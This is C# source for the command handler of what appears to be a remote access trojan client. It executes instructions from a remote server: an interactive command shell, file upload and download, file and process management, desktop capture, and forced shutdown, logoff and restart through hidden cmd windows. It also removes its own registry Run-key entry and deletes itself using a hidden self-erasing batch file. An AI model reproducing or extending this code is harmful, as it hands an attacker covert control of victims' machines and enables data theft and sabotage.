using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Client.Handlers;
using Client.Network;
using Client.Utils;
using Microsoft.Win32;
using PacketLib;

namespace Client.Handlers
{
    internal class HandlePacket
    {
        public byte[] packet {  get; set; }
        public void Run(object state) 
        {
            if (packet == null) return;
            MsgUnpack msgUnpack = new MsgUnpack();
            msgUnpack.Unpack(packet);
            switch (msgUnpack.GetAsString("Packet"))
            {
                case "Info":
                    {
                        new HandleInfo();
                        break;
                    }
                case "Ping":
                    {
                        Thread.Sleep(1500);
                        MsgPack msgPack = new MsgPack();
                        msgPack.Set("Packet", "Ping");
                        msgPack.Set("Message", "From client !");
                        _Client.Send(msgPack.Pack());
                        break;
                    }
                case "StartShell":
                    {
                        HandleShell.StartShell();
                        break;
                    }
                case "CmdShell":
                    {
                        HandleShell.CmdShell(msgUnpack.GetAsString("Cmd"));
                        break;
                    }
                case "StopShell":
                    {
                        HandleShell.StopShell();
                        break;
                    }
                case "FileManager":
                    {
                        new HandleFileManager(msgUnpack);
                        break;
                    }
                case "Download":
                    {
                        new HandleDownload(msgUnpack);
                        break;
                    }
                case "Upload":
                    {
                        new HandleUpload().Run(msgUnpack);
                        break;
                    }
                case "Desktop":
                    {
                        new HandleDesktop().Run(msgUnpack);
                        break;
                    }
                case "ProcessManager":
                    {
                        new HandleProcessManager().Run(msgUnpack);
                        break;
                    }
                case "Shutdown":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /s /f /t 00",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "LogOff":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /l /f",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Restart":
                    {
                        Process proc = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "cmd",
                                Arguments = "/c Shutdown /r /f /t 00",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                            }
                        };
                        proc.Start();
                        break;
                    }
                case "Kill":
                    {
                        if (Settings.AppStartup)
                        {
                            var registrykey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", RegistryKeyPermissionCheck.ReadWriteSubTree);                  
                            registrykey.DeleteValue(Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location));
                            registrykey.Close();
                        }
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("CD " + Application.StartupPath);
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                        break;
                    }
                case "Reconnect":
                    {
                        string batch = Path.GetTempFileName() + ".bat";
                        using (StreamWriter sw = new StreamWriter(batch))
                        {
                            sw.WriteLine("@echo off");
                            sw.WriteLine("timeout 3 > NUL");
                            sw.WriteLine("START " + "\"" + "\" " + "\"" + Application.ExecutablePath + "\"");
                            sw.WriteLine("CD " + Path.GetTempPath());
                            sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                        }
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = batch,
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        Environment.Exit(0);
                        break;
                    }
            }
        }
    }
}
